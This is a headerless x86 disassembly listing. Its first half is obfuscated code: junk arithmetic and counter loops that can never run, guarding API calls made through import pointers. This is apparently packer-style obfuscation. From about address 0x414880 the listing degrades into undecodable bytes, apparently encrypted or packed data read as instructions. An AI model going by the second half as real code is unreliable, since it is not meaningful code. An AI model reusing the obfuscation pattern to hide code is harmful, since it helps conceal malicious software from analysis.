  4142e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4142ea:	xor    DWORD PTR ds:0x42a2e6,ecx
  4142f0:	xor    ecx,eax
  4142f2:	add    ecx,esi
  4142f4:	mov    ecx,0x242ebc9
  4142f9:	mov    edi,DWORD PTR ds:0x42a29a
  4142ff:	mov    edi,0xf641bc8
  414304:	je     0x41b4b4
  41430a:	mov    ebx,DWORD PTR ds:0x42a256
  414310:	adc    DWORD PTR ds:0x42a25e,ebx
  414316:	mov    edx,DWORD PTR [ebp+0x8]
  414319:	and    DWORD PTR ds:0x42a2ae,0x0
  414323:	jmp    0x414337
  414328:	xor    ebx,ebx
  41432a:	add    ebx,DWORD PTR ds:0x42a2ae
  414330:	inc    ebx
  414331:	mov    DWORD PTR ds:0x42a2ae,ebx
  414337:	cmp    DWORD PTR ds:0x42a2ae,0x12
  41433e:	jae    0x414383
  414344:	cmp    DWORD PTR ds:0x42a2ae,0xc
  41434b:	jle    0x414383
  414351:	jmp    0x414362
  414356:	push   DWORD PTR [ebp-0xc]
  414359:	push   DWORD PTR [ebp-0x18]
  41435c:	call   DWORD PTR ds:0x42a3c2
  414362:	cmp    DWORD PTR ds:0x42a2ae,0xb
  414369:	jne    0x41437e
  41436f:	xor    ebx,ebx
  414371:	or     ebx,DWORD PTR ds:0x42a2ae
  414377:	inc    ebx
  414378:	mov    DWORD PTR ds:0x42a2ae,ebx
  41437e:	jmp    0x414328
  414383:	mov    ebx,DWORD PTR [ebp-0x8]
  414386:	xor    edx,eax
  414388:	adc    DWORD PTR ds:0x42a276,0x42a272
  414392:	xor    ebx,eax
  414394:	sub    edx,ebx
  414396:	sub    DWORD PTR ds:0x42a256,0x2df9
  4143a0:	sub    edx,esi
  4143a2:	and    DWORD PTR ds:0x42a27e,0x0
  4143ac:	jmp    0x4143be
  4143b1:	mov    ebx,DWORD PTR ds:0x42a27e
  4143b7:	inc    ebx
  4143b8:	mov    DWORD PTR ds:0x42a27e,ebx
  4143be:	cmp    DWORD PTR ds:0x42a27e,0x1e
  4143c5:	jae    0x414409
  4143cb:	cmp    DWORD PTR ds:0x42a27e,0x9
  4143d2:	jb     0x414409
  4143d8:	jmp    0x4143e8
  4143dd:	push   0x1065
  4143e2:	call   DWORD PTR ds:0x42a3c6
  4143e8:	cmp    DWORD PTR ds:0x42a27e,0x8
  4143ef:	jne    0x414404
  4143f5:	xor    ebx,ebx
  4143f7:	or     ebx,DWORD PTR ds:0x42a27e
  4143fd:	inc    ebx
  4143fe:	mov    DWORD PTR ds:0x42a27e,ebx
  414404:	jmp    0x4143b1
  414409:	xor    edx,eax
  41440b:	or     ebx,0x35b
  414411:	mov    DWORD PTR [ebp+0x8],edx
  414414:	xor    DWORD PTR ds:0x42a27a,0x56cb
  41441e:	mov    edx,DWORD PTR [ebp+0x8]
  414421:	mov    DWORD PTR ds:0x42a2b2,0x1c
  41442b:	cmp    DWORD PTR ds:0x42a2b2,0x0
  414432:	je     0x41446a
  414438:	cmp    DWORD PTR ds:0x42a2b2,0x1f
  41443f:	jl     0x41446a
  414445:	jmp    0x414458
  41444a:	push   DWORD PTR [ebp-0x18]
  41444d:	push   0x42a2e2
  414452:	call   DWORD PTR ds:0x42a3fa
  414458:	mov    ebx,DWORD PTR ds:0x42a2b2
  41445e:	dec    ebx
  41445f:	mov    DWORD PTR ds:0x42a2b2,ebx
  414465:	jmp    0x41442b
  41446a:	mov    ebx,DWORD PTR [ebp-0x58]
  41446d:	add    edx,0x5708fa
  414473:	sub    DWORD PTR ds:0x42a2ae,0x42a262
  41447d:	imul   edx,ebx
  414480:	movzx  ebx,WORD PTR ds:0x42a2b6
  414487:	sbb    DWORD PTR ds:0x42a2e2,ebx
  41448d:	mov    DWORD PTR [ebp-0x58],edx
  414490:	mov    edx,DWORD PTR [ebp+0x8]
  414493:	and    DWORD PTR ds:0x42a2de,0x0
  41449d:	xor    ebx,ebx
  41449f:	xor    ebx,DWORD PTR ds:0x42a2de
  4144a5:	inc    ebx
  4144a6:	mov    DWORD PTR ds:0x42a2de,ebx
  4144ac:	cmp    DWORD PTR ds:0x42a2de,0x7
  4144b3:	jl     0x4144f3
  4144b9:	jmp    0x4144cc
  4144be:	push   DWORD PTR [ebp-0x20]
  4144c1:	push   0x42a286
  4144c6:	call   DWORD PTR ds:0x42a40a
  4144cc:	cmp    DWORD PTR ds:0x42a2de,0x6
  4144d3:	jne    0x4144e6
  4144d9:	mov    ebx,DWORD PTR ds:0x42a2de
  4144df:	inc    ebx
  4144e0:	mov    DWORD PTR ds:0x42a2de,ebx
  4144e6:	cmp    DWORD PTR ds:0x42a2de,0x14
  4144ed:	jb     0x41449d
  4144f3:	mov    ebx,DWORD PTR [ebp-0x54]
  4144f6:	adc    DWORD PTR ds:0x42a296,0x1f0e
  414500:	add    edx,0x64f898
  414506:	sub    DWORD PTR ds:0x42a2aa,0x42a2d6
  414510:	or     edx,ebx
  414512:	and    DWORD PTR ds:0x42a2ca,0x0
  41451c:	mov    ebx,DWORD PTR ds:0x42a2ca
  414522:	inc    ebx
  414523:	mov    DWORD PTR ds:0x42a2ca,ebx
  414529:	cmp    DWORD PTR ds:0x42a2ca,0x22
  414530:	jb     0x414559
  414536:	jmp    0x41454c
  41453b:	push   DWORD PTR [ebp-0x1c]
  41453e:	push   DWORD PTR [ebp-0x1c]
  414541:	push   0x5112
  414546:	call   DWORD PTR ds:0x42a40e
  41454c:	cmp    DWORD PTR ds:0x42a2ca,0x19
  414553:	jb     0x41451c
  414559:	mov    DWORD PTR [ebp-0x54],edx
  41455c:	sbb    DWORD PTR ds:0x42a2a6,0x5e0b
  414566:	mov    edx,DWORD PTR [ebp+0x8]
  414569:	mov    ebx,DWORD PTR [ebp-0x50]
  41456c:	and    DWORD PTR ds:0x42a2fa,0x42a25e
  414576:	add    edx,ecx
  414578:	add    DWORD PTR ds:0x42a2ae,0x23c2
  414582:	xor    edx,ebx
  414584:	mov    DWORD PTR [ebp-0x50],edx
  414587:	sbb    edx,edx
  414589:	mov    edx,DWORD PTR [ebp+0x8]
  41458c:	add    ebx,DWORD PTR ds:0x42a2f6
  414592:	mov    ebx,DWORD PTR [ebp-0x4c]
  414595:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  41459f:	add    edx,edi
  4145a1:	and    edx,ebx
  4145a3:	mov    DWORD PTR [ebp-0x4c],edx
  4145a6:	and    DWORD PTR ds:0x42a2ee,0x0
  4145b0:	jmp    0x4145c2
  4145b5:	mov    edx,DWORD PTR ds:0x42a2ee
  4145bb:	inc    edx
  4145bc:	mov    DWORD PTR ds:0x42a2ee,edx
  4145c2:	cmp    DWORD PTR ds:0x42a2ee,0x1d
  4145c9:	jae    0x4145fc
  4145cf:	cmp    DWORD PTR ds:0x42a2ee,0x2d
  4145d6:	jbe    0x4145fc
  4145dc:	jmp    0x4145f7
  4145e1:	push   DWORD PTR [ebp-0x14]
  4145e4:	push   DWORD PTR [ebp-0x20]
  4145e7:	push   0x1476
  4145ec:	push   0x4291d1
  4145f1:	call   DWORD PTR ds:0x42a3ca
  4145f7:	jmp    0x4145b5
  4145fc:	mov    edx,DWORD PTR [ebp+0x8]
  4145ff:	mov    ebx,DWORD PTR [ebp-0x48]
  414602:	adc    DWORD PTR ds:0x42a29a,0x42a25e
  41460c:	lea    edx,[ebx+edx*1+0x241fcdf]
  414613:	adc    DWORD PTR ds:0x42a292,0x5ee0
  41461d:	mov    DWORD PTR [ebp-0x48],edx
  414620:	mov    edx,DWORD PTR [ebp+0x8]
  414623:	neg    ebx
  414625:	mov    ebx,0xfa5e1524
  41462a:	sub    ebx,edx
  41462c:	add    ebx,DWORD PTR [ebp-0x44]
  41462f:	mov    DWORD PTR [ebp-0x44],ebx
  414632:	mov    edx,DWORD PTR ds:0x42a36a
  414638:	mov    edx,DWORD PTR [edx]
  41463a:	and    DWORD PTR ds:0x42a2fa,edx
  414640:	mov    edx,DWORD PTR [ebp+0x8]
  414643:	xor    edx,eax
  414645:	mov    DWORD PTR ds:0x42a2f6,0x6c5b
  41464f:	add    edx,esi
  414651:	jne    0x41430a
  414657:	jmp    0x41b4b4
  41465c:	sub    DWORD PTR ds:0x42a286,0x1976
  414666:	mov    edx,DWORD PTR [ebp-0xc]
  414669:	and    DWORD PTR ds:0x42a2f6,0x0
  414673:	jmp    0x414685
  414678:	mov    ebx,DWORD PTR ds:0x42a2f6
  41467e:	inc    ebx
  41467f:	mov    DWORD PTR ds:0x42a2f6,ebx
  414685:	cmp    DWORD PTR ds:0x42a2f6,0x16
  41468c:	jae    0x4146bc
  414692:	cmp    DWORD PTR ds:0x42a2f6,0x26
  414699:	ja     0x4146bc
  41469f:	jmp    0x4146b7
  4146a4:	push   0x71cf
  4146a9:	push   DWORD PTR [ebp-0x24]
  4146ac:	push   0x8216
  4146b1:	call   DWORD PTR ds:0x42a412
  4146b7:	jmp    0x414678
  4146bc:	sub    edx,esi
  4146be:	xor    ebx,DWORD PTR ds:0x42a296
  4146c4:	xor    edx,eax
  4146c6:	sub    DWORD PTR ds:0x42a292,edx
  4146cc:	mov    DWORD PTR [ebp-0x5c],edx
  4146cf:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  4146d9:	mov    edx,DWORD PTR [ebp-0x10]
  4146dc:	mov    ebx,DWORD PTR [ebp-0x8]
  4146df:	mov    DWORD PTR ds:0x42a2a6,0x1dc1
  4146e9:	xor    edx,eax
  4146eb:	and    DWORD PTR ds:0x42a2f2,0x42a2aa
  4146f5:	xor    ebx,eax
  4146f7:	sub    edx,ebx
  4146f9:	or     DWORD PTR ds:0x42a2a2,0x5c58
  414703:	sub    edx,esi
  414705:	xor    DWORD PTR ds:0x42a2ee,0x42a272
  41470f:	xor    edx,eax
  414711:	mov    DWORD PTR ds:0x42a2c6,0x43a7
  41471b:	mov    DWORD PTR [ebp-0x10],edx
  41471e:	mov    edx,DWORD PTR [ebp-0x14]
  414721:	mov    DWORD PTR ds:0x42a27a,0x5a8e
  41472b:	mov    DWORD PTR [ebp+0x8],edx
  41472e:	jmp    0x416bda
  414733:	and    DWORD PTR ds:0x42a262,0x0
  41473d:	xor    edx,edx
  41473f:	or     edx,DWORD PTR ds:0x42a262
  414745:	inc    edx
  414746:	mov    DWORD PTR ds:0x42a262,edx
  41474c:	cmp    DWORD PTR ds:0x42a262,0xb
  414753:	jge    0x4147a6
  414759:	jmp    0x41477f
  41475e:	push   0x42a28a
  414763:	push   DWORD PTR [ebp-0x18]
  414766:	push   DWORD PTR [ebp-0x14]
  414769:	push   0x686f
  41476e:	push   0x7e68
  414773:	push   DWORD PTR [ebp-0x1c]
  414776:	push   DWORD PTR [ebp-0x14]
  414779:	call   DWORD PTR ds:0x42a3ce
  41477f:	cmp    DWORD PTR ds:0x42a262,0xa
  414786:	jne    0x414799
  41478c:	mov    edx,DWORD PTR ds:0x42a262
  414792:	inc    edx
  414793:	mov    DWORD PTR ds:0x42a262,edx
  414799:	cmp    DWORD PTR ds:0x42a262,0x18
  4147a0:	jb     0x41473d
  4147a6:	mov    edx,DWORD PTR [ebp+0x8]
  4147a9:	adc    DWORD PTR ds:0x42a2e2,edi
  4147af:	mov    ebx,DWORD PTR [ebp-0x8]
  4147b2:	adc    DWORD PTR ds:0x42a25e,0x42a292
  4147bc:	xor    edx,eax
  4147be:	add    DWORD PTR ds:0x42a29e,0x4f03
  4147c8:	xor    ebx,eax
  4147ca:	sbb    DWORD PTR ds:0x42a2e2,0x7f15
  4147d4:	sub    edx,ebx
  4147d6:	and    DWORD PTR ds:0x42a2d2,0x0
  4147e0:	mov    ebx,DWORD PTR ds:0x42a2d2
  4147e6:	inc    ebx
  4147e7:	mov    DWORD PTR ds:0x42a2d2,ebx
  4147ed:	cmp    DWORD PTR ds:0x42a2d2,0x21
  4147f4:	jle    0x414817
  4147fa:	jmp    0x41480a
  4147ff:	push   0x5080
  414804:	call   DWORD PTR ds:0x42a3d6
  41480a:	cmp    DWORD PTR ds:0x42a2d2,0x1a
  414811:	jb     0x4147e0
  414817:	sub    edx,esi
  414819:	xor    edx,eax
  41481b:	mov    DWORD PTR [ebp+0x8],edx
  41481e:	mov    edx,DWORD PTR [ebp+0x8]
  414821:	mov    ebx,DWORD PTR [ebp-0x58]
  414824:	add    edx,0x5708fa
  41482a:	imul   edx,ebx
  41482d:	mov    DWORD PTR [ebp-0x58],edx
  414830:	mov    edx,DWORD PTR [ebp+0x8]
  414833:	mov    ebx,DWORD PTR [ebp-0x54]
  414836:	add    edx,0x64f898
  41483c:	or     edx,ebx
  41483e:	mov    DWORD PTR [ebp-0x54],edx
  414841:	mov    edx,DWORD PTR [ebp+0x8]
  414844:	mov    ebx,DWORD PTR [ebp-0x50]
  414847:	add    edx,ecx
  414849:	xor    edx,ebx
  41484b:	mov    DWORD PTR [ebp-0x50],edx
  41484e:	mov    edx,DWORD PTR [ebp+0x8]
  414851:	mov    ebx,DWORD PTR [ebp-0x4c]
  414854:	add    edx,edi
  414856:	and    edx,ebx
  414858:	mov    DWORD PTR [ebp-0x4c],edx
  41485b:	mov    edx,DWORD PTR [ebp+0x8]
  41485e:	mov    ebx,DWORD PTR [ebp-0x48]
  414861:	lea    edx,[ebx+edx*1+0x241fcdf]
  414868:	mov    DWORD PTR [ebp-0x48],edx
  41486b:	mov    edx,DWORD PTR [ebp+0x8]
  41486e:	mov    ebx,0xfa5e1524
  414873:	sub    ebx,edx
  414875:	add    ebx,DWORD PTR [ebp-0x44]
  414878:	mov    DWORD PTR [ebp-0x44],ebx
  41487b:	jmp    0x416bda
  414880:	inc    esp
  414881:	arpl   WORD PTR [esi+esi*8],di
  414884:	and    al,0x96
  414886:	xchg   ch,cl
  414888:	sahf   
  414889:	pushf  
  41488a:	ja     0x41486e
  41488c:	cs dec ebx
  41488e:	or     BYTE PTR [edi],dh
  414890:	mov    bh,0x66
  414892:	jl     0x414817
  414894:	cmp    eax,0xa583835e
  414899:	ss ds popf 
  41489c:	pop    esp
  41489d:	stos   BYTE PTR es:[edi],al
  41489e:	sahf   
  41489f:	std    
  4148a0:	mov    bh,0x6e
  4148a2:	mov    bl,0xef
  4148a4:	fadd   st,st(5)
  4148a6:	dec    esi
  4148a7:	add    eax,0x743628d8
  4148ac:	call   0x5612e371
  4148b1:	jmp    0x37e6:0xf1fd6765
  4148b8:	sbb    eax,0x5c8a3d83
  4148bd:	pop    esi
  4148be:	pop    eax
  4148bf:	ins    DWORD PTR es:[edi],dx
  4148c0:	(bad)  
  4148c1:	repnz jecxz 0x414910
  4148c4:	or     bl,BYTE PTR [esi]
  4148c6:	xor    ebx,DWORD PTR [edi+0x40]
  4148c9:	lock stos DWORD PTR es:[edi],eax
  4148cb:	push   edi
  4148cc:	lods   eax,DWORD PTR ds:[esi]
  4148cd:	or     BYTE PTR [ebp-0x78],ah
  4148d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148d1:	popf   
  4148d2:	aad    0xe
  4148d4:	popf   
  4148d5:	mov    al,0x26
  4148d7:	sti    
  4148d8:	add    BYTE PTR [eax],dh
  4148da:	icebp  
  4148db:	xchg   ebx,eax
  4148dc:	cwde   
  4148dd:	data16 xlat BYTE PTR ds:[ebx]
  4148df:	jecxz  0x4148d1
  4148e1:	xor    DWORD PTR ds:0xe98ad600,esi
  4148e7:	sub    ecx,DWORD PTR [eax-0x79]
  4148ea:	es nop
  4148ec:	mov    es,WORD PTR [esp+edi*1-0x5fe695de]
  4148f3:	push   0x65
  4148f5:	mov    bh,0x2a
  4148f7:	mov    esp,0x5e65db1a
  4148fc:	dec    ecx
  4148fd:	adc    bh,BYTE PTR [ebx+0x4]
  414900:	inc    ecx
  414901:	xor    DWORD PTR [ebp+0x45aa978c],eax
  414907:	mov    esp,0x5e54c038
  41490c:	jle    0x4148fe
  41490e:	or     al,0x9c
  414910:	inc    edx
  414911:	lods   eax,DWORD PTR ds:[esi]
  414912:	add    ebx,ebp
  414914:	xor    dl,BYTE PTR [edi]
  414916:	fsub   DWORD PTR [eax+esi*8+0x14]
  41491a:	ficomp WORD PTR [edi]
  41491c:	ficom  WORD PTR [eax]
  41491e:	sbb    esi,DWORD PTR [edx-0x1566bcd3]
  414924:	inc    ebp
  414925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414926:	pop    ebx
  414927:	rol    BYTE PTR [ecx],0x81
  41492a:	mov    DWORD PTR [edx+eax*8],edi
  41492d:	jo     0x414973
  41492f:	push   0xb98d88fc
  414934:	addr16 jmp 0x6a3f:0x854026a6
  41493c:	mov    ecx,0xd63667a
  414941:	xor    DWORD PTR [ebx],edi
  414943:	(bad)  
  414944:	mov    dh,0x86
  414946:	xor    al,0x77
  414948:	adc    ebx,ebx
  41494a:	nop
  41494b:	test   BYTE PTR [esi-0x65f1573b],al
  414951:	jbe    0x41498a
  414953:	xchg   esi,eax
  414954:	in     eax,dx
  414955:	jno    0x414982
  414957:	retf   0x7de3
  41495a:	call   0xa02b79ef
  41495f:	jecxz  0x41490f
  414961:	cli    
  414962:	addr16 inc edx
  414964:	pop    edi
  414965:	sub    DWORD PTR [ecx-0xccd57d8],eax
  41496b:	mov    eax,es:0xe5d1466b
  414971:	hlt    
  414972:	(bad)
  414975:	addr16 aad 0xc1
  414978:	adc    al,0x16
  41497a:	mov    edi,0x508c9336
  41497f:	push   edx
  414980:	out    0x39,al
  414982:	mov    ebp,0x9b583a26
  414987:	repz mov bh,dl
  41498a:	jp     0x4149aa
  41498c:	mov    esi,0xbc830b5e
  414991:	(bad)  
  414992:	lods   al,BYTE PTR ds:[esi]
  414993:	jbe    0x414979
  414995:	test   al,0xba
  414997:	xchg   edi,eax
  414998:	mov    eax,0xdfab3fac
  41499d:	dec    edx
  41499e:	in     al,dx
  41499f:	dec    ebx
  4149a0:	mov    eax,ds:0xf9ccbebd
  4149a5:	mov    cl,0x1e
  4149a7:	ds gs std 
  4149aa:	sbb    BYTE PTR [esi+esi*8-0x3317f3c8],ah
  4149b1:	test   BYTE PTR [ebx-0x5f],bl
  4149b4:	cs mov bl,0x20
  4149b7:	loop   0x4149cb
  4149b9:	in     eax,0x26
  4149bb:	iret   
  4149bc:	scas   al,BYTE PTR es:[edi]
  4149bd:	or     eax,0x2423d8a5
  4149c2:	mov    ds:0x69707b67,al
  4149c7:	mov    esi,0x2225fd36
  4149cc:	or     dh,ch
  4149ce:	pop    ds
  4149cf:	aaa    
  4149d0:	fdivr  QWORD PTR [ecx+0x161cca8e]
  4149d6:	cmp    BYTE PTR [edx],bl
  4149d8:	out    0x82,al
  4149da:	popa   
  4149db:	push   ds
  4149dc:	sub    eax,0x9c7adeaa
  4149e1:	push   esi
  4149e2:	sbb    BYTE PTR [eax+0x41d7c622],0x2d
  4149e9:	and    bh,BYTE PTR [ebp-0xc]
  4149ec:	adc    esi,eax
  4149ee:	(bad)  
  4149ef:	(bad)  
  4149f0:	sahf   
  4149f1:	jmp    0x414976
  4149f3:	xchg   ecx,eax
  4149f4:	out    dx,eax
  4149f5:	popa   
  4149f6:	enter  0xa684,0xfe
  4149fa:	fwait
  4149fb:	sti    
  4149fc:	xor    eax,0xe651c7f1
  414a01:	mov    esp,0x1e664c70
  414a06:	mov    dh,0xa5
  414a08:	push   cs
  414a09:	or     eax,0x5ee5216e
  414a0e:	rol    DWORD PTR [ebp-0xea7b218],0x6c
  414a15:	inc    ebx
  414a16:	pusha  
  414a17:	pop    ss
  414a18:	inc    eax
  414a19:	push   0xc2316d9d
  414a1e:	aas    
  414a1f:	sbb    eax,0xda87d471
  414a24:	inc    esi
  414a25:	inc    edi
  414a26:	lahf   
  414a27:	push   0xffffffd3
  414a29:	add    esi,DWORD PTR [esi]
  414a2b:	not    bl
  414a2d:	mov    ss,WORD PTR [ebp-0x6a]
  414a30:	dec    ecx
  414a31:	ret    
  414a32:	imul   eax,DWORD PTR [eax+0x17],0xe22e4efc
  414a39:	jns    0x4149e0
  414a3b:	add    dl,BYTE PTR [esi+0xcb7deb9]
  414a41:	int    0x3a
  414a43:	xchg   ecx,eax
  414a44:	xor    esp,DWORD PTR [ecx]
  414a46:	inc    edx
  414a47:	fbstp  TBYTE PTR [eax-0x15]
  414a4a:	nop
  414a4b:	ror    DWORD PTR [edx-0x21],0x4f
  414a4f:	xchg   esp,eax
  414a50:	popa   
  414a51:	pushf  
  414a52:	mul    DWORD PTR [edx-0x6e9174a6]
  414a58:	mov    bl,0x5e
  414a5a:	dec    edx
  414a5b:	outs   dx,BYTE PTR ds:[esi]
  414a5c:	call   0xb7e:0x1bc1c00f
  414a63:	jnp    0x414ad3
  414a65:	mov    ch,dh
  414a67:	fsubr  QWORD PTR [eax]
  414a69:	daa    
  414a6a:	xchg   DWORD PTR [edx+0x27c75e50],edi
  414a70:	cmc    
  414a71:	pop    ds
  414a72:	mov    ebp,0x34385aba
  414a77:	sbb    eax,0xfe6cff1c
  414a7c:	ds pusha 
  414a7e:	xchg   ebx,eax
  414a7f:	pop    edi
  414a80:	icebp  
  414a81:	add    eax,0xc32a1128
  414a86:	iret   
  414a87:	fstp   QWORD PTR [edx+0x3d]
  414a8a:	jno    0x414a22
  414a8c:	mov    cl,0xbc
  414a8e:	lea    esp,[edx-0x61df9965]
  414a94:	(bad)  
  414a95:	mov    ebp,DWORD PTR [edi-0x34]
  414a98:	dec    ebp
  414a99:	lods   al,BYTE PTR ds:[esi]
  414a9a:	jno    0x414a44
  414a9c:	arpl   WORD PTR [ebp-0x50a70b4],si
  414aa2:	iret   
  414aa3:	mul    BYTE PTR [edx-0x4c]
  414aa6:	imul   ebp,esp,0x15084f43
  414aac:	xchg   edi,eax
  414aad:	outs   dx,DWORD PTR ds:[esi]
  414aae:	or     eax,0xc98b784b
  414ab3:	dec    ebp
  414ab4:	mov    ebp,DWORD PTR [edx+edx*4+0x4fc4161d]
  414abb:	shl    esi,0x46
  414abe:	sahf   
  414abf:	cdq    
  414ac0:	cmp    bl,BYTE PTR [edi+eiz*2]
  414ac3:	push   eax
  414ac4:	inc    ebx
  414ac5:	pop    eax
  414ac6:	cmp    ah,BYTE PTR [ecx-0x7b]
  414ac9:	cmp    al,dl
  414acb:	lahf   
  414acc:	jp     0x414b3c
  414ace:	mov    ah,0x61
  414ad0:	push   eax
  414ad1:	test   DWORD PTR [edi+eax*2+0x4e],ebp
  414ad5:	pop    ds
  414ad6:	arpl   WORD PTR [eax-0x295ade46],ax
  414adc:	mov    edx,?
  414ade:	fwait
  414adf:	or     DWORD PTR [ebx+0x69],ecx
  414ae2:	test   DWORD PTR [eax-0x25042524],ecx
  414ae8:	add    al,BYTE PTR [eax+0x1d]
  414aeb:	pop    ds
  414aec:	and    DWORD PTR [edx],edx
  414aee:	rcl    BYTE PTR [esi+0x78e7737b],1
  414af4:	mov    edx,fs
  414af6:	adc    DWORD PTR [ebp-0x725b447],ecx
  414afc:	cwde   
  414afd:	add    dl,ah
  414aff:	mov    esp,0xfb535b6
  414b04:	jnp    0x414af7
  414b06:	pop    ebp
  414b07:	jl     0x414b75
  414b09:	sub    BYTE PTR [edi+0x51],0x65
  414b0d:	mov    esi,0x44b82e31
  414b12:	fsubr  QWORD PTR [ebx]
  414b14:	test   DWORD PTR [edi+0xb],eax
  414b17:	dec    eax
  414b18:	test   eax,0x3733707
  414b1d:	pushfw 
  414b1f:	scas   al,BYTE PTR es:[edi]
  414b20:	jmp    0x414ad0
  414b22:	in     eax,dx
  414b23:	pop    edi
  414b24:	jnp    0x414b0c
  414b26:	mov    ebp,0xb408c449
  414b2b:	inc    ebp
  414b2c:	in     eax,dx
  414b2d:	fcomp  QWORD PTR [ebx]
  414b2f:	dec    eax
  414b30:	jae    0x414b6c
  414b32:	retf   
  414b33:	ret    0xbd5f
  414b36:	push   esi
  414b37:	in     al,dx
  414b38:	(bad)  
  414b39:	ins    DWORD PTR es:[edi],dx
  414b3a:	scas   al,BYTE PTR es:[edi]
  414b3b:	xchg   DWORD PTR [ecx],edx
  414b3d:	adc    eax,0xc8748bf2
  414b42:	add    ecx,DWORD PTR [edi-0x54]
  414b45:	int    0x25
  414b47:	push   0xc9d618c4
  414b4c:	lods   al,BYTE PTR ds:[esi]
  414b4d:	mov    edx,0x8e66625
  414b52:	adc    cl,dl
  414b54:	xchg   DWORD PTR [edi-0x37],esi
  414b57:	xchg   ecx,eax
  414b58:	jmp    0xdd581187
  414b5d:	pop    ebp
  414b5e:	test   BYTE PTR [ebx],dl
  414b60:	test   DWORD PTR [eax],ecx
  414b62:	cdq    
  414b63:	adc    eax,0xf3261e81
  414b68:	pop    ebp
  414b69:	inc    DWORD PTR ds:0xd25e4583
  414b6f:	test   DWORD PTR [bx+di+0x69],ebp
  414b73:	push   es
  414b74:	dec    eax
  414b75:	pop    ebx
  414b76:	pop    ss
  414b77:	mov    al,0x42
  414b79:	fst    DWORD PTR [ebx]
  414b7b:	mov    bl,0x1a
  414b7d:	mov    BYTE PTR [ecx+eiz*2-0x50],bl
  414b81:	mov    eax,0x128a5090
  414b86:	imul   esi,DWORD PTR [ebp+eax*1-0x42520ff5],0x5
  414b8e:	mov    ds:0xfeca0642,eax
  414b93:	xor    al,0xbb
  414b95:	inc    edi
  414b96:	repz mov db5,edi
  414b9a:	jno    0x414bf6
  414b9c:	in     al,0x94
  414b9e:	cmp    eax,0xdfb57c6
  414ba3:	add    al,BYTE PTR [eax-0x9]
  414ba6:	sub    eax,0x794e03a5
  414bab:	cli    
  414bac:	jecxz  0x414bd4
  414bae:	out    0x63,eax
  414bb0:	(bad)  
  414bb2:	dec    ebp
  414bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bb4:	cmp    al,0xf
  414bb6:	jmp    0x5cd5:0x61f2513
  414bbd:	cmp    eax,0x9f829f5a
  414bc2:	mul    bh
  414bc4:	cmp    BYTE PTR [edx+0x3e],bl
  414bc7:	fucomi st,st(7)
  414bc9:	mov    ebp,?
  414bcb:	and    bl,BYTE PTR [esi]
  414bcd:	cmp    al,0x12
  414bcf:	pop    ebx
  414bd0:	hlt    
  414bd1:	das    
  414bd2:	popa   
  414bd3:	mov    eax,ds:0x914a9ea0
  414bd8:	push   es
  414bd9:	xlat   BYTE PTR ds:[ebx]
  414bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bdb:	cmp    DWORD PTR [edi-0x7b],esp
  414bde:	xchg   esp,eax
  414bdf:	jp     0x414c3a
  414be1:	push   eax
  414be2:	in     al,0x74
  414be4:	add    eax,0xd7324917
  414be9:	aas    
  414bea:	mov    edx,DWORD PTR [edx-0x2f67973d]
  414bf0:	adc    DWORD PTR gs:[edx+0x52ba6cd2],ebx
  414bf7:	lods   al,BYTE PTR ds:[esi]
  414bf8:	cmp    BYTE PTR [ecx+0x5c5ffb10],ch
  414bfe:	not    BYTE PTR [ebx+0x29b66205]
  414c04:	jmp    0xdc22:0xeae67a6d
  414c0b:	(bad)  
  414c0c:	movq   mm0,mm0
  414c0f:	dec    esp
  414c10:	stos   BYTE PTR es:[edi],al
  414c11:	test   al,0x40
  414c13:	mov    cl,0x35
  414c15:	out    dx,al
  414c16:	stc    
  414c17:	out    0x84,eax
  414c19:	cdq    
  414c1a:	xor    DWORD PTR ds:[edi],ebp
  414c1d:	aaa    
  414c1e:	idiv   dh
  414c20:	add    ax,0xe24
  414c24:	clc    
  414c25:	in     eax,dx
  414c26:	loopne 0x414c30
  414c28:	sbb    edx,DWORD PTR [ecx-0x273ce0ce]
  414c2e:	or     al,0x26
  414c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c31:	mov    DWORD PTR [esi+edx*8],esp
  414c34:	push   cs
  414c35:	jge    0x414cad
  414c37:	fld    QWORD PTR [esi-0xb4ba5b]
  414c3d:	psadbw mm0,QWORD PTR [esi]
  414c40:	pop    esp
  414c41:	into   
  414c42:	scas   al,BYTE PTR es:[edi]
  414c43:	repz fstp QWORD PTR [ebx-0x23fc9fd8]
  414c4a:	sbb    al,0xb8
  414c4c:	aam    0x7
  414c4e:	xlat   BYTE PTR ds:[ebx]
  414c4f:	sub    BYTE PTR [ecx+0x1c361e22],dl
  414c55:	sbb    al,0x33
  414c57:	sub    eax,edi
  414c59:	sti    
  414c5a:	sbb    DWORD PTR [ecx],edx
  414c5c:	xor    eax,0xc1a2b94d
  414c61:	cs (bad) 
  414c63:	sub    eax,0x36b8dc4c
  414c68:	dec    BYTE PTR cs:[edi+0x38563f7d]
  414c6f:	(bad)  
  414c70:	add    al,0x2e
  414c72:	pop    es
  414c73:	retf   0x5483
  414c76:	mov    edx,0x475fef18
  414c7b:	mov    ecx,DWORD PTR [ebp-0x1766852d]
  414c81:	cdq    
  414c82:	pop    es
  414c83:	rcl    BYTE PTR [ecx-0x63fee374],cl
  414c89:	sub    cl,BYTE PTR [edx+0x3ded6df2]
  414c8f:	adc    BYTE PTR [esi],ah
  414c91:	fwait
  414c92:	jp     0x414cac
  414c94:	sub    BYTE PTR [ebx+ecx*8-0x59],cl
  414c98:	jle    0x414c61
  414c9a:	jl     0x414c53
  414c9c:	dec    esp
  414c9d:	mov    al,ds:0x9bb5e0d6
  414ca2:	and    ebx,DWORD PTR [edi+0x22]
  414ca5:	cmp    esi,DWORD PTR [ecx]
  414ca7:	push   0xfa6c2711
  414cac:	aaa    
  414cad:	cdq    
  414cae:	repnz repz std 
  414cb1:	inc    ecx
  414cb2:	cmp    al,BYTE PTR [esi+0x1704adbb]
  414cb8:	(bad)  
  414cb9:	cs fwait
  414cbb:	jmp    0xf9d2:0xe02492d3
  414cc2:	xchg   edi,eax
  414cc3:	gs mov dl,0xe2
  414cc6:	cdq    
  414cc7:	jns    0x414c7b
  414cc9:	rol    BYTE PTR [edx-0x23],cl
